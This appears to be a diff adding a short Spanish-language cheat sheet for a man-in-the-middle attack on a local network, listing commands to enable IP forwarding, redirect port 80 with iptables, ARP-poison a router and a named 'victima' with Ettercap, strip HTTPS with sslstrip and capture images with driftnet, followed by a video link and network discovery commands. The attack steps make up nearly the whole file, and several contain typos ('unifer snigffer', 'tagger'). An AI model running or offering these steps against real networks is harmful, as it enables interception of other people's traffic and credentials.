@@ -1,0 +1,19 @@
+Ettercap + Driftnet 
+
+1. echo 1 > /proc/sys/net/ipv4/ip_forward
+2. iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+3. leafpad /etc/ettercap/etter.conf 
+4. quito comentarios a redir_command_on y redir_command_off
+5. ettercap -G -> selecciono unifer snigffer ->  seleciono red 
+5. hots -> host list -> scanner for host
+6. seleciono tag1 con la ip del router
+7. selecciono tag2 con la ip de la victima 
+8. tagger -> current tagger
+9. sslstrip -l 8080 
+10. driftnet -i wlan0/eth0
+
+https://www.youtube.com/watch?v=cjLmGsr8GjA
+
+ifconfig
+netdiscover
+route -n
